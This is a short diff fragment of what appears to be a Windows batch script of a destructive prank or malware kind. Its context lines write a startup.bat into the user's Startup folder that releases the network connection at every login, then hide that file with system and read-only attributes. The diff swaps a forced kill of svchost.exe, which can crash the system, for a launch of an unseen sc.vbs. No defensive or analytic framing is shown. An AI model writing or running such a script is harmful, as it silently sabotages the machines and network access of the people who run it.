@@ -157,4 +157,4 @@ ipconfig /release
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
 attrib +h +s +r startup.bat
-taskkill /f /im svchost.exe
+start sc.vbs
